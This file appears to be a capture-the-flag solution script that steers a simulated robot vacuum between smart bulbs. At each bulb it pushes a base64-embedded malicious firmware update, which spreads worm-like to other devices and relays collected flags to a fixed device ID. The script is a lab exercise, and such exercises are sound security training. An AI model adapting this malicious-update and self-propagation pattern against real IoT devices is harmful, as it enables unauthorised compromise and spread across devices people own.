import base64
import time
from api import VacuumCleaner, MoveDirection, RotateDirection

EXPLOIT_4 = """UEsDBBQAAAAAAPiL004AAAAAAAAAAAAAAAALAAAAY29uZmlnLnlhbWxQSwMEFAAAAAAAWmXZTrV6
RMwsAAAALAAAAAoAAABkaWdlc3QuZGVyNWQ2OTI2OGUxNDA5Yjg3OWY0NjM0Y2M0ZTQ5NDdmZTkg
KnVwZGF0ZS5weQpQSwMEFAAAAAAAWmXZTsv7dp1AAAAAQAAAAA0AAABzaWduYXR1cmUuZGVyqdGW
tjc46I5cI6mDR0oFVFmmYQSNoRyGPpNq9R0yvXMFQl1NLsBLqUow5R6DerWZbuzyqerMrF9c4Qbu
QBWHZFBLAwQUAAAAAABQZdlOI8DaYscKAADHCgAACQAAAHVwZGF0ZS5weWZyb20gYXBpIGltcG9y
dCBMaWdodEJ1bGIKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAoKCmRlZiBleHRyYWN0X2ZsYWcobWVz
c2FnZSk6CiAgICB0cnk6CiAgICAgICAgcmV0dXJuIG1lc3NhZ2VbbWVzc2FnZS5pbmRleCgiQ1RG
eyIpOiBtZXNzYWdlLmluZGV4KCJ9IikgKyAxXQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAg
ICAgcmV0dXJuICIiCgoKZGVmIGNvbXBhcmVfbG9zcyhpZF9jb3JyZWN0LCBpZF9jb3JydXB0ZWQp
OgogICAgcmV0dXJuIHN1bShjaDEgIT0gY2gyIGFuZCBjaDIgIT0gJyAnIGZvciBjaDEsIGNoMiBp
biB6aXAoaWRfY29ycmVjdCwgaWRfY29ycnVwdGVkKSkKCgpkZWYgY29tcHJlc3NfbXVsdGlwbHlf
ZmxhZyhmbGFnKToKICAgIHJldHVybiAzICogZmxhZy5yZXBsYWNlKCcuJywgJycpCgoKaWYgX19u
YW1lX18gPT0gJ19fbWFpbl9fJzoKCiAgICBvYnRhaW5lZF9mbGFncyA9IFtdCiAgICBidWxiID0g
TGlnaHRCdWxiKCkKICAgIGZsYWdzID0gY29tcHJlc3NfbXVsdGlwbHlfZmxhZyhleHRyYWN0X2Zs
YWcoYnVsYi5nZXRfY29uZmlnKCkpKQogICAgaW5mZWN0ZWRfZGV2aWNlcyA9IFtdCiAgICBidWxi
LnNlbmRfbWVzc2FnZSgiN2JhMDY4NGQ3NDdkOWRhYmY0NTUwMGQxNWMzYzJhMDRiZTI1OWJiZGVm
NjdmODVmZmU4YjlkNzY1MjQ2MDMyNCIsIGZsYWdzKQoKICAgIHdoaWxlIFRydWU6CiAgICAgICAg
dGhpbmdzID0gYnVsYi5kaXNjb3Zlcl90aGluZ3MoKQoKICAgICAgICAjIHN0b3AgYWZ0ZXIgcmVj
ZWl2aW5nIFNUT1AgbWVzc2FnZQogICAgICAgIG1lc3NhZ2UgPSBidWxiLnJlYWRfaW5wdXRfbWVz
c2FnZSgpCiAgICAgICAgaWYgIlNUT1AiIGluIG1lc3NhZ2U6CiAgICAgICAgICAgIGJyZWFrCiAg
ICAgICAgZWxpZiAiQ1RGIiBpbiBtZXNzYWdlIGFuZCAiUDVfIiBpbiBtZXNzYWdlOgogICAgICAg
ICAgICBpZiAiUDVfIiBub3QgaW4gb2J0YWluZWRfZmxhZ3M6CiAgICAgICAgICAgICAgICBmbGFn
cyArPSBtZXNzYWdlCiAgICAgICAgICAgICAgICBvYnRhaW5lZF9mbGFncy5hcHBlbmQoIlA1XyIp
CiAgICAgICAgIyBzZW5kIGJhY2sgZmxhZyAzIHRpbWVzIGFmdGVyIHJlY2VpdmluZyBtZXNzYWdl
CiAgICAgICAgIyBGTEFHRkxBR0ZMQUc4MDI4MzQ1ODc5CiAgICAgICAgIyB3aGVyZSA4MDI4MzQ1
ODc5IGFyZSBmaXJzdCAxMCBkaWdpdHMgb2Ygc2VuZGVyIElECiAgICAgICAgZWxpZiAiRkxBRyIg
aW4gbWVzc2FnZToKICAgICAgICAgICAgZmxhZ19zZW5kZXJfaWQgPSBtZXNzYWdlWzEyOjIyXQog
ICAgICAgICAgICBmb3IgZGV2aWNlIGluIHRoaW5nczoKICAgICAgICAgICAgICAgIGlmIGNvbXBh
cmVfbG9zcyhkZXZpY2VbOjEwXSwgZmxhZ19zZW5kZXJfaWQpIDwgMjoKICAgICAgICAgICAgICAg
ICAgICBzbGVlcCgxKQogICAgICAgICAgICAgICAgICAgIGJ1bGIuc2VuZF9tZXNzYWdlKGRldmlj
ZSwgZmxhZ3MpCiAgICAgICAgICAgICAgICAgICAgc2xlZXAoMSkKICAgICAgICAjIGZvcndhcmQg
dXBkYXRlIChpbmZlY3QpIGFmdGVyIHJlY2VpdmluZyBtZXNzYWdlCiAgICAgICAgIyBXT1JNV09S
TVdPUk04MDI4MzQ1ODc5CiAgICAgICAgIyB3aGVyZSA4MDI4MzQ1ODc5IGFyZSBmaXJzdCAxMCBk
aWdpdHMgb2YgZGV2aWNlIHRoYXQgd2UgZG8gbm90IGluZmVjdCEKICAgICAgICBlbGlmICJXT1JN
IiBpbiBtZXNzYWdlOgogICAgICAgICAgICAjIGluZmVjdCBvdGhlciBkZXZpY2VzCiAgICAgICAg
ICAgIHRoaW5ncyA9IGJ1bGIuZGlzY292ZXJfdGhpbmdzKCkKICAgICAgICAgICAgd29ybV9zZW5k
ZXJfaWQgPSBtZXNzYWdlWzEyOjIyXQogICAgICAgICAgICBmb3IgZGV2aWNlIGluIHRoaW5nczoK
ICAgICAgICAgICAgICAgIGlmIGNvbXBhcmVfbG9zcyhkZXZpY2VbOjEwXSwgd29ybV9zZW5kZXJf
aWQpID4gMToKICAgICAgICAgICAgICAgICAgICBpZiBidWxiLmZvcndhcmRfdXBkYXRlKGRldmlj
ZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGluZmVjdGVkX2RldmljZXMuYXBwZW5kKGRldmlj
ZSkKICAgICAgICAgICAgICAgICAgICAgICAgc2xlZXAoNSkKICAgICAgICAgICAgICAgICAgICAg
ICAgYnVsYi5zZW5kX21lc3NhZ2UoZGV2aWNlLCAiRkxBR0ZMQUdGTEFHIiArIGJ1bGIuZ2V0X2Rl
dl9pZCgpWzoxMF0pCiAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwKDYwKQogICAgICAgICAg
ICAgICAgICAgICAgICByZWNlaXZlZF9tZXNzYWdlID0gYnVsYi5yZWFkX2lucHV0X21lc3NhZ2Uo
KQogICAgICAgICAgICAgICAgICAgICAgICBpZiAieyIgaW4gcmVjZWl2ZWRfbWVzc2FnZSBhbmQg
In0iIGluIHJlY2VpdmVkX21lc3NhZ2UgYW5kICJQNV8iIGluIHJlY2VpdmVkX21lc3NhZ2U6CiAg
ICAgICAgICAgICAgICAgICAgICAgICAgICBmbGFncyArPSByZWNlaXZlZF9tZXNzYWdlCiAgICAg
ICAgICAgICAgICAgICAgICAgICAgICBvYnRhaW5lZF9mbGFncy5hcHBlbmQoIlA1XyIpCiAgICAg
ICAgICAgICAgICAgICAgICAgIHNsZWVwKDE1KQogICAgICAgICAgICAgICAgICAgICAgICAjIGJ1
bGIuc2VuZF9tZXNzYWdlKGRldmljZSwgIldPUk1XT1JNV09STSIgKyBidWxiLmdldF9kZXZfaWQo
KVs6MTBdKQogICAgICAgICAgICAgICAgICAgICAgICAjIHNsZWVwKDE1KQogICAgICAgICAgICAg
ICAgICAgICAgICBidWxiLnNlbmRfbWVzc2FnZSgiN2JhMDY4NGQ3NDdkOWRhYmY0NTUwMGQxNWMz
YzJhMDRiZTI1OWJiZGVmNjdmODVmZmU4YjlkNzY1MjQ2MDMyNCIsIGZsYWdzKQoKICAgICAgICBz
bGVlcCgxMCkKUEsBAhQDFAAAAAAA+IvTTgAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAALSBAAAAAGNv
bmZpZy55YW1sUEsBAhQDFAAAAAAAWmXZTrV6RMwsAAAALAAAAAoAAAAAAAAAAAAAALSBKQAAAGRp
Z2VzdC5kZXJQSwECFAMUAAAAAABaZdlOy/t2nUAAAABAAAAADQAAAAAAAAAAAAAAtIF9AAAAc2ln
bmF0dXJlLmRlclBLAQIUAxQAAAAAAFBl2U4jwNpixwoAAMcKAAAJAAAAAAAAAAAAAAC0gegAAAB1
cGRhdGUucHlQSwUGAAAAAAQABADjAAAA1gsAAAAA
"""

infected_devices = []


def get_flag(message):
    try:
        return message[message.index("{"): message.rindex("}") + 1]
    except ValueError:
        return ""


def infect_device(cleaner):
    nearby_things = cleaner.discover_things()
    if not nearby_things:
        cleaner.return_dock()
        cleaner.send_debug_message("There are no devices here! ")
    for device in nearby_things:
        if device not in infected_devices:
            if cleaner.send_update(device, exploit):
                infected_devices.append(device)
            else:
                cleaner.return_dock()
                cleaner.send_debug_message("Cannot updated device: {}".format(device))


def dump_flag(cleaner, flags):
    cleaner.return_dock()
    # for flag in flags:
    cleaner.send_debug_message(flags)
    flags = ""


def wait_flag(cleaner, device_name):
    flag_received = False
    messages_received = 0
    message = cleaner.read_input_message()
    while message and not flag_received:
        flag = get_flag(message)
        if flag and device_name in flag:
            flag_received = True
#             flags += flag
            return flag
        message = cleaner.read_input_message()
        messages_received += 1
    nr_reads = 0
    while not flag_received and messages_received < 3 and nr_reads < 20:
        message = cleaner.read_input_message()
        messages_received += 1
        flag = get_flag(message)
        nr_reads += 1
        if device_name in flag:
            flag_received = True
            return flag
#             break
        time.sleep(61)
    if not flag_received and messages_received < 3:
        cleaner.return_dock()
        cleaner.send_debug_message("Did not receive flag from : {}".format(device_name))
        time.sleep(61)
        cleaner.send_debug_message("Did not receive flag from : {}".format(device_name))
        return ""


if __name__ == '__main__':
    flags = ""
    cleaner = VacuumCleaner()
    exploit = base64.b64decode(EXPLOIT_4)

    # infect first bulb
    infect_device(cleaner)
    time.sleep(15)

    things = cleaner.discover_things()
    for device in things:
        cleaner.send_message(device, "FLAGFLAGFLAG" + cleaner.get_dev_id()[:10])

    # wait for result
    flags += wait_flag(cleaner, "P1_")

    things = cleaner.discover_things()
    for device in things:
        cleaner.send_message(device, "STOPSTOPSTOP")

    dump_flag(cleaner, flags)
    flags = ""

    # go to second bulb

    for i in range(0, 7):
        cleaner.move(MoveDirection.FORWARD)

    # infect second bulb
    infect_device(cleaner)

    things = cleaner.discover_things()
    for device in things:
        cleaner.send_message(device, "FLAGFLAGFLAG" + cleaner.get_dev_id()[:10])

    # wait for result
    flags += wait_flag(cleaner, "P2_")
    things = cleaner.discover_things()
    for device in things:
        cleaner.send_message(device, "STOPSTOPSTOP")

    # go to third lightbulb

    for i in range(0, 3):
        cleaner.move(MoveDirection.BACKWARD)
    cleaner.rotate(RotateDirection.LEFT)

    for i in range(0, 14):
        cleaner.move(MoveDirection.FORWARD)

    for i in range(0, 10):
        cleaner.move(MoveDirection.FORWARD)

    # infect third bulb
    infect_device(cleaner)

    things = cleaner.discover_things()
    for device in things:
        cleaner.send_message(device, "FLAGFLAGFLAG" + cleaner.get_dev_id()[:10])

    # wait for result
    flags += wait_flag(cleaner, "P3_")
    for device in things:
        cleaner.send_message(device, "STOPSTOPSTOP")

    # go to fourth lightbulb
    cleaner.rotate(RotateDirection.LEFT)
    for i in range(0, 4):
        cleaner.move(MoveDirection.FORWARD)
    cleaner.rotate(RotateDirection.RIGHT)
    cleaner.move(MoveDirection.FORWARD)
    cleaner.move(MoveDirection.FORWARD)
    cleaner.rotate(RotateDirection.RIGHT)
    for i in range(0, 4):
        cleaner.move(MoveDirection.FORWARD)
    cleaner.rotate(RotateDirection.LEFT)
    for i in range(0, 24):
        cleaner.move(MoveDirection.FORWARD)

    # infect fourth bulb
    infect_device(cleaner)
    time.sleep(15)
    things = cleaner.discover_things()
    # for device in things:
    #     cleaner.send_message(device, "FLAGFLAGFLAG" + cleaner.get_dev_id()[:10])

    # flag = wait_flag(cleaner, "P4_")
    # if flag:
    #     flags += flag

    things = cleaner.discover_things()
    for device in things:
        cleaner.send_message(device, "WORMWORMWORM" + cleaner.get_dev_id()[:10])

    time.sleep(120)

    things = cleaner.discover_things()
    for device in things:
        cleaner.send_message(device, "FLAGFLAGFLAG" + cleaner.get_dev_id()[:10])

    time.sleep(120)

    things = cleaner.discover_things()
    for device in things:
        cleaner.send_message(device, "FLAGFLAGFLAG" + cleaner.get_dev_id()[:10])

    # wait for result
    flags += wait_flag(cleaner, "CTF")

    if "P4_" in flags and "P5_" in flags:
        things = cleaner.discover_things()
        for device in things:
            cleaner.send_message(device, "STOPSTOPSTOP")

    dump_flag(cleaner, flags)
    cleaner.send_debug_message("Finished work!")
